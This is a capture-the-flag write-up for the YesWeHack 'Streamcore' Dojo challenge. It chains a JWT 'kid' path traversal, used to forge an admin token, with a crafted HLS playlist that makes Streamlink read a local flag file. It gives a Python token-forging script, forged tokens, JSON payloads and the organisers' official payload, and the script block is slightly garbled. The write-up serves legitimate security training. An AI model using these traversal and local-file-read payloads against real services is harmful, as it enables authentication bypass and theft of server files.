---
title: "Streamcore – JWT kid Path Traversal & HLS LFI to Sensitive Data Exposure"
date: 2026-07-20
draft: false
description: "We chain a JWT kid path traversal to forge an admin token with a local file inclusion via a malicious HLS playlist in Streamlink to read arbitrary files."
tags:
  - Yeswehack
  - ctf
categories:
  - DoJo
  - web
  - concepts
---

  # Streamcore – JWT kid Path Traversal & HLS Playlist LFI to Sensitive Data Exposure

  ## Description

  The challenge presents us with a custom HLS ingest service called "streamcore" built in Python. Our goal is to read `/tmp/flag.txt`, but there are two obstacles in our way: an authentication check requiring an admin JWT, and a file-reading mechanism restricted to processing HLS streams via `streamlink`.

  Looking at the source code, we spot two distinct vulnerabilities that chain together perfectly:

  1. **JWT `kid` Path Traversal:** The `verify_token` function extracts the `kid` header from the JWT and uses it directly to fetch the HMAC signing key from the filesystem (`f"/tmp/keys/{kid}.txt"`). Because `kid` is not sanitized, we can traverse out of the `/tmp/keys/` directory and point the verification routine to a file whose contents we already know.
  2. **HLS Playlist Local File Inclusion:** Once authenticated, we can write an arbitrary HLS playlist to `/tmp/{filename}.m3u8`. The app then passes this playlist to `streamlink`. By crafting a malicious playlist with a segment URI pointing to the flag, `streamlink` will resolve and fetch that local file, and the server happily reflects its contents back to us.

  By chaining these flaws, an unauthenticated attacker can forge an admin token and trick the service into reading arbitrary files from the server's filesystem, resulting in **Sensitive Data Exposure**.

  Dojo link - https://dojo-yeswehack.com/challenge-of-the-month/dojo-52

  ## Exploitation

  ### 1. Identifying the Target for Key Forgery

  To forge a JWT, we need to know the HMAC secret. The setup script creates a random secret in `/tmp/keys/<random>.txt`, which we cannot guess. However, it also creates `/tmp/README.txt` with a hardcoded, predictable string:

  ```python
  with open("/tmp/README.txt", "w") as f:
      f.write("streamcore is a new project developed to handle u3m8 files more easily.")
  ```

  If we can force the application to use this file as the signing key, we can forge tokens.

  ### 2. Crafting the Path-Traversal `kid`

  The `load_key` function constructs the path unsafely:
  ```python
  def load_key(kid: str) -> bytes:
      with open(f"/tmp/keys/{kid}.txt", "rb") as f:
          return f.read()
  ```

  By setting the JWT header `kid` to `../README`, the server builds the path `/tmp/keys/../README.txt`, which resolves to `/tmp/README.txt`.

  ### 3. Forging the Admin Token

  We sign a JWT with the payload `{"isadmin": True}` using the known README string as the HMAC secret, and inject our traversal `kid` into the header.

  ### 4. Building the Malicious HLS Playlist

  With the admin token accepted, the application writes our `content` to `/tmp/{filename}.m3u8` and processes it with `streamlink`:

  ```python
  streams = streamlink.streams(f"hls://file:///{filename_path}")
  ```

  We can provide a minimal HLS playlist that defines a segment pointing to our target file. Because the playlist is saved in `/tmp/`, a relative segment URI like `flag.txt` will resolve to `/tmp/flag.txt`. Alternatively, as highlighted in the official solution, we can use an absolute path like `file:///tmp/flag.txt` to exploit how Streamlink <= 8.3.0 handles local file URIs.

  ### 5. Reading the Flag

  When the server processes the playlist, `streamlink` fetches the segment (which is our flag file). The application reads the stream and renders the chunk in the web UI, giving us the flag.

  ## PoC

  ### Step 1 – Forge Admin Token

  The following Python script generates the forged JWT using PyJWT:

  ```python
  import jwt
  iimport jwt
import json

# Known content of /tmp/README.txt
secret = b"streamcore is a new project developed to handle u3m8 files more easily."

# Path traversal kid to load /tmp/keys/../README.txt
kid = "../README"

# Forge admin token
token = jwt.encode(
    {"isadmin": True},
    secret,
    algorithm="HS256",
    headers={"kid": kid}
)

# Build the final JSON payload
payload = {
    "filename": "pwn",
    "content": "#EXTM3U\n#EXTINF:10.0,\nflag.txt\n#EXT-X-ENDLIST\n",
    "token": token
}

print(json.dumps(payload))
  ```

  Token output (shortened for readability):

  ```text
  eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uL1JFQURNRSIsInR5cCI6IkpXVCJ9.eyJpc2FkbWluIjp0cnVlfQ.ma7hL-YrU031b3g9WouAbxkq408z5PYIBGXSnMZ5wQE
  ```

  ### Step 2 – Build the Final JSON Payload

  We construct the final JSON payload expected by the application, injecting our forged token and the malicious m3u8 playlist:

  ```python
  payload = {
      "filename": "pwn",
      "content": "#EXTM3U\n#EXTINF:10.0,\nflag.txt\n#EXT-X-ENDLIST\n",
      "token": token
  }

  print(json.dumps(payload))
  ```

  Example request payload:

  ```json
  {"filename":"pwn","content":"#EXTM3U\n#EXTINF:10.0,\nflag.txt\n#EXT-X-ENDLIST\n","token":"eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uL1JFQURNRSIsInR5cCI6IkpXVCJ9.eyJpc2FkbWluIjp0cnVlfQ.ma7hL-YrU031b3g9WouAbxkq408z5PYIBGXSnMZ5wQE"}
  ```

  ### Step 3 – Start Exploit 

  Filename
  ```text
  pwn
  ```

  Manifest content
  ```text
  #EXTM3U
  #EXTINF:10.0,
  flag.txt
  #EXT-X-ENDLIST
  ```

  Auth token
  ```text
  eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uL1JFQURNRSIsInR5cCI6IkpXVCJ9.eyJpc2FkbWluIjp0cnVlfQ.ma7hL-YrU031b3g9WouAbxkq408z5PYIBGXSnMZ5wQE
  ```
  ![Exploit](/images/streamcore/streamcore1.PNG)


  Done! We solve the dojo  

  ![Exploit](/images/streamcore/streamcore2.PNG)


  # Official Solution from YesWeHack Team 

  Hey!

  Congrats on capturing the flag! 🚩 Thanks for taking part in this month's Dojo challenge, we hope you enjoyed it!

  Official solution

  Here's the official walkthrough for Streamcore.

  The exploit chains three pieces together:

  - Forge an admin token: The verify_token function loads the HMAC key from `/tmp/keys/{kid}.txt` without sanitizing kid. We point it at a file with known, predictable contents: `/tmp/README.txt`, using a traversal path. Since we now control the signing key, we can forge a valid token with isadmin: true.
  - Write a malicious playlist: With the admin token accepted, we set filename to poc and supply content that exploits CVE-2026-44353 in Streamlink <= 8.3.0, an m3u8 playlist pointing at a local file via file:///tmp/flag.txt.
  - Read the flag. When the server opens the "stream," Streamlink fetches the local file and the contents are reflected back through the web UI.

  Final payload:

  ```json
  {"filename":"poc","content":"#EXTM3U\n#EXT-X-VERSION:3\n#EXT-X-TARGETDURATION:5\n#EXT-X-PLAYLIST-TYPE:VOD\n#EXTINF:5.0,\nfile:///tmp/flag.txt\n#EXT-X-ENDLIST\n","token":"eyJhbGciOiJIUzI1NiIsImtpZCI6Ii8uLi8uLi8uLi8uLi90bXAvUkVBRE1FIiwidHlwIjoiSldUIn0.eyJpc2FkbWluIjp0cnVlfQ.9q3BWShOa8sh_S_8FpBcYR5ztrLZiV8wpF8Uq9a0F4w"}
  ```

  Happy hacking! 😃

  Best regards,
  YesWeHack / Brumens